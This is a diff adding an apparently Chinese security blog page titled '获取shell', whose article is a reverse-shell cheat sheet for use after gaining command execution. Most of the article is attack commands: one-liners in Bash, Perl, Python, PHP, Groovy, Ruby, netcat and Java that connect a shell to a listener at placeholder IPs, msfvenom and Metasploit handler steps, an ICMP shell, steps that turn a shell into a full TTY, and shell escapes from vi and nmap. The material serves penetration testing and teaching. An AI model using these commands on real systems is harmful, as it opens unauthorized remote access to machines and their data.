@@ -1,0 +1,1097 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>获取shell</title>
+    <meta name="description" content="">
+
+    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
+    <link rel="stylesheet" href="/css/main.css ">
+    <link rel="canonical" href="http://localhost:4000/2017/11/27/reverse-shell/">
+    <link rel="alternate" type="application/rss+xml" title="Jirairya" href="http://localhost:4000/feed.xml ">
+
+
+    <script>
+    // 百度统计代码
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?973906e37cc7bcb6714807627cf64ec6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+
+
+    <script>
+    // google analytics
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-111240288-1', 'auto');
+      ga('send', 'pageview');
+
+    </script>
+
+
+
+</head>
+
+
+  <body>
+
+    <header id="top">
+    <div class="wrapper">
+        <a href="/" class="brand">Jirairya</a>
+        <small></small>
+        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
+        <nav id="headerNav">
+            <ul>
+                <li>
+                    
+                    <a href="/">
+                    
+                        <i class="fa fa-home"></i>Home
+                    </a>
+                </li>
+
+                
+                    
+                    <li>
+                        
+                        <a href="/archive/">
+                        
+                            <i class="fa fa-archive"></i>Archives
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/category/">
+                        
+                            <i class="fa fa-th-list"></i>Categories
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tag/">
+                        
+                            <i class="fa fa-tags"></i>Tags
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/collections/">
+                        
+                            <i class="fa fa-folder-open"></i>Collections
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/skills/">
+                        
+                            <i class="fa fa-bezier-curve"></i>Skills
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tools/">
+                        
+                            <i class="fa fa-toolbox"></i>Tools
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/about/">
+                        
+                            <i class="fa fa-paper-plane"></i>About
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="page clearfix" post>
+    <div class="left">
+        <h1>获取shell</h1>
+        <div class="label">
+
+            <div class="label-card">
+                <i class="fa fa-calendar"></i>2017-11-27
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+            
+
+
+<!-- <span class="point">•</span> -->
+<span class="categories">
+  <i class="fa fa-th-list"></i>
+  
+    
+        <a href="/category/#hack" title="Category: hack" rel="category">hack</a>&nbsp;
+    
+        <a href="/category/#sec" title="Category: sec" rel="category">sec</a>
+    
+  
+
+  <!-- <span class="point">•</span> -->
+</span>
+
+
+            </div>
+
+            <div class="label-card">
+            
+<!-- <span class="point">•</span> -->
+<span class="pageTag">
+  <i class="fa fa-tags"></i>
+  
+    
+        <!--a href="/tag/#shell" title="Tag: shell" rel="tag">shell</a-->
+        <a href="/tag/#shell" title="Tag: shell" rel="tag">shell</a>&nbsp;
+    
+        <!--a href="/tag/#command" title="Tag: command" rel="tag">command</a-->
+        <a href="/tag/#command" title="Tag: command" rel="tag">command</a>&nbsp;
+    
+        <!--a href="/tag/#reverseshell" title="Tag: reverseshell" rel="tag">reverseshell</a-->
+        <a href="/tag/#reverseshell" title="Tag: reverseshell" rel="tag">reverseshell</a>
+    
+  
+
+</span>
+
+            </div>
+
+        </div>
+        <hr>
+        <article itemscope itemtype="http://schema.org/BlogPosting">
+        <ul id="markdown-toc">
+  <li><a href="#反弹shell" id="markdown-toc-反弹shell">反弹shell</a>    <ul>
+      <li><a href="#bash" id="markdown-toc-bash">Bash</a></li>
+      <li><a href="#perl" id="markdown-toc-perl">Perl</a></li>
+      <li><a href="#python" id="markdown-toc-python">Python</a></li>
+      <li><a href="#php" id="markdown-toc-php">PHP</a></li>
+      <li><a href="#revshgroovy" id="markdown-toc-revshgroovy">revsh.groovy</a></li>
+      <li><a href="#ruby" id="markdown-toc-ruby">Ruby</a></li>
+      <li><a href="#netcat" id="markdown-toc-netcat">netcat</a></li>
+      <li><a href="#go" id="markdown-toc-go">Go</a></li>
+      <li><a href="#java" id="markdown-toc-java">Java</a></li>
+      <li><a href="#assembly" id="markdown-toc-assembly">assembly</a></li>
+      <li><a href="#xterm" id="markdown-toc-xterm">Xterm</a></li>
+    </ul>
+  </li>
+  <li><a href="#icmp-shell" id="markdown-toc-icmp-shell">icmp-shell</a></li>
+  <li><a href="#tunnakali_bind" id="markdown-toc-tunnakali_bind">tunna+kali_bind</a></li>
+  <li><a href="#将普通shell升级为全交互式终端" id="markdown-toc-将普通shell升级为全交互式终端">将普通shell升级为全交互式终端</a>    <ul>
+      <li><a href="#nc反向shell" id="markdown-toc-nc反向shell">NC反向Shell</a></li>
+      <li><a href="#msf的payload-shell" id="markdown-toc-msf的payload-shell">msf的payload shell</a>        <ul>
+          <li><a href="#python的伪终端" id="markdown-toc-python的伪终端">python的伪终端</a></li>
+          <li><a href="#socat" id="markdown-toc-socat">Socat</a></li>
+          <li><a href="#升级netcat" id="markdown-toc-升级netcat">升级netcat</a></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><a href="#shell-spawning" id="markdown-toc-shell-spawning">Shell Spawning</a>    <ul>
+      <li><a href="#from-within-irb" id="markdown-toc-from-within-irb">From within IRB</a></li>
+      <li><a href="#from-within-vi" id="markdown-toc-from-within-vi">From within vi</a></li>
+      <li><a href="#from-within-vi-1" id="markdown-toc-from-within-vi-1">From within vi</a></li>
+      <li><a href="#from-within-nmap" id="markdown-toc-from-within-nmap">From within nmap</a></li>
+    </ul>
+  </li>
+  <li><a href="#refer" id="markdown-toc-refer">refer：</a></li>
+</ul>
+
+<!--more-->
+
+<p>在得到命令执行漏洞情况下，需要一个交互式shell。无法添加新的账户，或者写入密钥到<code class="highlighter-rouge">~/.ssh/</code>文件夹下，下一步就是将bash绑定到TCP端口上进行shell反弹。</p>
+
+<h1 id="反弹shell">反弹shell</h1>
+
+<h2 id="bash">Bash</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.10.16/4444 0&gt;&amp;1
+</code></pre></div></div>
+
+<h2 id="perl">Perl</h2>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">perl</span> <span class="o">-</span><span class="nv">e</span> <span class="s">'use Socket;$i="10.10.10.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span>
+</code></pre></div></div>
+
+<h2 id="python">Python</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+</code></pre></div></div>
+
+<h2 id="php">PHP</h2>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">php</span> <span class="o">-</span><span class="nx">r</span> <span class="s1">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
+</code></pre></div></div>
+
+<h2 id="revshgroovy">revsh.groovy</h2>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">String</span> <span class="n">host</span><span class="o">=</span><span class="s">"localhost"</span><span class="o">;</span>
+<span class="kt">int</span> <span class="n">port</span><span class="o">=</span><span class="mi">8044</span><span class="o">;</span>
+<span class="n">String</span> <span class="n">cmd</span><span class="o">=</span><span class="s">"cmd.exe"</span><span class="o">;</span>
+<span class="n">Process</span> <span class="n">p</span><span class="o">=</span><span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="n">cmd</span><span class="o">).</span><span class="na">redirectErrorStream</span><span class="o">(</span><span class="kc">true</span><span class="o">).</span><span class="na">start</span><span class="o">();</span><span class="n">Socket</span> <span class="n">s</span><span class="o">=</span><span class="k">new</span> <span class="n">Socket</span><span class="o">(</span><span class="n">host</span><span class="o">,</span><span class="n">port</span><span class="o">);</span><span class="n">InputStream</span> <span class="n">pi</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(),</span><span class="n">pe</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getErrorStream</span><span class="o">(),</span> <span class="n">si</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span><span class="n">OutputStream</span> <span class="n">po</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">(),</span><span class="n">so</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span><span class="k">while</span><span class="o">(!</span><span class="n">s</span><span class="o">.</span><span class="na">isClosed</span><span class="o">()){</span><span class="k">while</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pi</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">so</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">pe</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="k">while</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">available</span><span class="o">()&gt;</span><span class="mi">0</span><span class="o">)</span><span class="n">po</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">si</span><span class="o">.</span><span class="na">read</span><span class="o">());</span><span class="n">so</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">po</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span><span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">50</span><span class="o">);</span><span class="k">try</span> <span class="o">{</span><span class="n">p</span><span class="o">.</span><span class="na">exitValue</span><span class="o">();</span><span class="k">break</span><span class="o">;}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){}};</span><span class="n">p</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span><span class="n">s</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</code></pre></div></div>
+
+<h2 id="ruby">Ruby</h2>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>require<span class="o">(</span><span class="s1">'child_process'</span><span class="o">)</span>.exec<span class="o">(</span><span class="s1">'bash -i &gt;&amp; /dev/tcp/1.2.3.4/80 0&gt;&amp;1'</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h2 id="netcat">netcat</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-e</span> /bin/sh 10.0.0.1 1234
+</code></pre></div></div>
+
+<p>不支持<code class="highlighter-rouge">-e</code>选项，也可以：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.0.0.1 1234 <span class="o">&gt;</span>/tmp/f
+nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999
+</code></pre></div></div>
+
+<h2 id="go">Go</h2>
+
+<p><a href="https://github.com/sysdream/hershell">Hershell</a>:Go语言编写的多平台化的反向shell</p>
+
+<h2 id="java">Java</h2>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">([</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span><span class="o">]</span> <span class="n">as</span> <span class="n">String</span><span class="o">[])</span>
+<span class="n">p</span><span class="o">.</span><span class="na">waitFor</span><span class="o">()</span>
+</code></pre></div></div>
+
+<h2 id="assembly"><a href="https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/">assembly</a></h2>
+
+<p><a href="https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/">汇编反向shell</a></p>
+
+<h2 id="xterm">Xterm</h2>
+
+<p>最简单的反向shell是xterm 会话，气将通过TCP的6001端口反向连接10.0.0.1：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xterm <span class="nt">-display</span> 10.0.0.1:1
+</code></pre></div></div>
+
+<p>要捕获传入的xtrem，就启动<code class="highlighter-rouge">X-Server</code>(:1监听6001的TCP端口)，另外就是可以通过Xnest监听</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Xnest :1
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xhost +targetip
+</code></pre></div></div>
+
+<h1 id="icmp-shell">icmp-shell</h1>
+
+<p>见<a href="https://github.com/inquisb/icmpsh">icmpsh</a></p>
+
+<p>kali：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./run.sh
+</code></pre></div></div>
+
+<p>target:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icmpsh.exe <span class="nt">-t</span> kali_ip <span class="nt">-d</span> 500 <span class="nt">-b</span> 30 <span class="nt">-s</span> 128
+</code></pre></div></div>
+
+<h1 id="tunnakali_bind">tunna+kali_bind</h1>
+
+<p>见<a href="http://www.91ri.org/11722.html">Shell反弹不出来怎么办呢？</a></p>
+
+<p>本机kali不是外网或者目标在dmz里面反弹不出shell，可以通过这种直连shell然后再通过http的端口转发到本地的metasploit</p>
+
+<p>0x01 在kali上生成一个bind_shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell/bind_tcp <span class="nv">LPORT</span><span class="o">=</span>12345 <span class="nt">-f</span> exe <span class="nt">-o</span> ./shell.exe
+</code></pre></div></div>
+
+<p>0x02 在kali上使用tunna转发：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python proxy.py <span class="nt">-u</span> http://test.com/conn.jsp  <span class="nt">-l</span> 1111 <span class="nt">-r</span> 12345 v
+</code></pre></div></div>
+
+<p>0x03 使用kali连接bind_shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+<span class="nb">set </span>payload windows/x64/shell/bind_tcp
+<span class="nb">set </span>LPORT 1111
+<span class="nb">set </span>RHOST 127.0.0.1
+</code></pre></div></div>
+
+<h1 id="将普通shell升级为全交互式终端">将普通shell升级为全交互式终端</h1>
+
+<p>见<a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Upgrading simple shells to fully interactive TTYs</a>:https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</p>
+
+<p>非交互式的终端缺点很多：</p>
+<ul>
+  <li>标准错误信息不会显示</li>
+  <li>不能正常使用vim</li>
+  <li>没有命令补全
+…</li>
+</ul>
+
+<h2 id="nc反向shell">NC反向Shell</h2>
+
+<p>攻击机器进行nc监听：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvlp</span> 8888
+</code></pre></div></div>
+
+<p><img src="/img/hack/tty_shell/nc_listen.png" alt="" /></p>
+
+<p>被攻击机器:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-e</span> /bin/sh 10.10.10.166 8888
+</code></pre></div></div>
+
+<p><img src="/img/hack/tty_shell/nc_connect.png" alt="" /></p>
+
+<h2 id="msf的payload-shell">msf的payload shell</h2>
+
+<p>查找msf生成正向shell或者反向shell的payload：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-l</span> payloads | <span class="nb">grep</span> <span class="s2">"cmd/unix"</span> | awk <span class="s1">'{print $1}'</span>
+</code></pre></div></div>
+
+<p><img src="/img/hack/tty_shell/msf_payload.png" alt="" /></p>
+
+<p>使用msfvenom生成<code class="highlighter-rouge">reverse_netcat</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> cmd/unix/reverse_netcat <span class="nv">LHOST</span><span class="o">=</span>10.10.10.166 <span class="nv">LPORT</span><span class="o">=</span>8888 R
+</code></pre></div></div>
+
+<p>生成结果：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mknod /tmp/pqgi p<span class="p">;</span> nc 10.10.10.166 8888 0&lt;/tmp/pqgi | /bin/sh <span class="o">&gt;</span>/tmp/pqgi 2&gt;&amp;1<span class="p">;</span> rm /tmp/pqgi
+</code></pre></div></div>
+
+<p><img src="/img/hack/tty_shell/reverse_netcat_r.png" alt="" /></p>
+
+<p>监听连接如下：</p>
+
+<p><img src="/img/hack/tty_shell/nc_connect_unix_cmd_netcat.png" alt="" /></p>
+
+<p><strong>在没有netcat的情况下，使用perl生成反向连接：</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> cmd/unix/reverse_perl <span class="nv">LHOST</span><span class="o">=</span>10.10.10.166 <span class="nv">LPORT</span><span class="o">=</span>8888 R
+</code></pre></div></div>
+
+<p>生成结果如下：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl <span class="nt">-MIO</span> <span class="nt">-e</span> <span class="s1">'$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.10.166:8888");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);while(&lt;&gt;){if($_=~ /(.*)/){system $1;}};'</span>
+</code></pre></div></div>
+
+<p><img src="/img/hack/tty_shell/reverse_perl_r.png" alt="" />
+<img src="/img/hack/tty_shell/nc_connect_unix_cmd_perl.png" alt="" /></p>
+
+<p>不能使用<code class="highlighter-rouge">su</code>等功能，功能很少：</p>
+
+<p><img src="/img/hack/tty_shell/python_tty_nosu.png" alt="" /></p>
+
+<h3 id="python的伪终端">python的伪终端</h3>
+
+<p>使用python命令生成伪终端：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import pty; pty.spawn("/bin/bash")'</span>
+</code></pre></div></div>
+
+<p><em>解决了<code class="highlighter-rouge">su</code>功能，但是没有补全等功能。</em></p>
+
+<p><img src="/img/hack/tty_shell/python_tty.png" alt="" /></p>
+
+<h3 id="socat">Socat</h3>
+
+<p><a href="http://www.dest-unreach.org/socat/doc/socat.html">Socat</a>类似于netcat，通过TCP进行连接，若在受害者服务器上安装了socat，就可以通过其反弹一个反向shell</p>
+
+<p>在靶机上安装socat:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt-get install socat
+</code></pre></div></div>
+<blockquote>
+  <p>可在<code class="highlighter-rouge">https://github.com/andrew-d/static-binaries</code>下载，然后改变权限<code class="highlighter-rouge">chmod +x socat</code></p>
+</blockquote>
+
+<p>首先在kali运行监听：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat file:<span class="sb">`</span>tty<span class="sb">`</span>,raw,echo<span class="o">=</span>0 tcp-listen:8888
+</code></pre></div></div>
+
+<p>在靶机上反弹shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:10.10.10.166:8888
+</code></pre></div></div>
+
+<p>得到一个完整的tty会话，有完整的交互功能</p>
+
+<p><img src="/img/hack/tty_shell/socat.png" alt="" /></p>
+
+<h3 id="升级netcat">升级netcat</h3>
+
+<p>基本的步骤：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//在kali得到的反向shell中：
+python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+Ctrl-Z //暂停shell窗口
+
+//在kali的Terminal:
+<span class="nb">echo</span> <span class="nv">$TERM</span> // 获取xterm-256color
+stty <span class="nt">-a</span> //得到rows,columns
+stty raw <span class="nt">-echo</span> 
+<span class="nb">fg</span> //恢复nc监听的shell
+reset
+
+//在kali得到的反向shell中：
+<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
+stty rows &lt;num&gt; columns &lt;cols&gt;
+</code></pre></div></div>
+
+<p>在得到反向shell之后，使用python得到伪tty，并<code class="highlighter-rouge">Ctrl-Z</code>暂停反向shell，放于后台：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvlp</span> 4444
+python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+Ctrl-Z
+</code></pre></div></div>
+
+<p><img src="/img/hack/tty_shell/netcat_upgrade_stopped.png" alt="" /></p>
+
+<p>获取TERM的信息和当前tty的窗口大小：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$TERM</span>
+
+stty <span class="nt">-a</span>
+
+stty raw <span class="nt">-echo</span>
+</code></pre></div></div>
+
+<p><img src="/img/hack/tty_shell/netcat_upgrade_stty_a.png" alt="" /></p>
+
+<p>输入<code class="highlighter-rouge">fg</code>，后车之后，得到原始的<code class="highlighter-rouge">nc -nvlp 4444</code>，继续输入<code class="highlighter-rouge">reset</code>，恢复反向shell.
+然后根据之前获取的信息设置shell，就可以得到一个功能完整的tty交互shell：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">fg
+
+</span>reset
+
+<span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>bash
+<span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm256-color
+stty rows 24 columns 80
+</code></pre></div></div>
+
+<p><img src="/img/hack/tty_shell/netcat_upgrade_full_tty.png" alt="" /></p>
+
+<h1 id="shell-spawning">Shell Spawning</h1>
+
+<p>http://netsec.ws/?p=337</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import pty; pty.spawn("/bin/sh")'</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>os.system<span class="o">(</span><span class="s1">'/bin/bash'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/sh <span class="nt">-i</span>
+</code></pre></div></div>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">perl</span> <span class="err">—</span><span class="nv">e</span> <span class="s">'exec "/bin/sh";'</span>
+</code></pre></div></div>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">perl:</span> <span class="nb">exec</span> <span class="s">"/bin/sh"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ss">ruby: </span><span class="nb">exec</span> <span class="s2">"/bin/sh"</span>
+</code></pre></div></div>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">lua</span><span class="p">:</span> <span class="nb">os.execute</span><span class="p">(</span><span class="s1">'/bin/sh'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="from-within-irb">From within IRB</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exec</span> <span class="s2">"/bin/sh"</span>
+</code></pre></div></div>
+
+<h2 id="from-within-vi">From within vi</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>:!bash
+</code></pre></div></div>
+
+<h2 id="from-within-vi-1">From within vi</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>:set <span class="nv">shell</span><span class="o">=</span>/bin/bash:shell
+</code></pre></div></div>
+
+<h2 id="from-within-nmap">From within nmap</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!sh
+</code></pre></div></div>
+
+<h1 id="refer">refer：</h1>
+
+<ul>
+  <li>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</li>
+  <li>http://www.91ri.org/11722.html</li>
+  <li>http://netsec.ws/?p=337</li>
+</ul>
+
+        </article>
+        <hr>
+
+        
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                        
+                        <h2 id="similar_posts">Similar Posts</h2>
+                        <ul>
+                        
+                        <li class="relatedPost">
+                            <a href="/2017/12/30/exploit-domain/">域渗透的整理
+                            
+                            </a>
+                        </li>
+                        
+                        
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+        
+            
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
+                
+                    
+                
+            
+                
+                    
+                
+                    
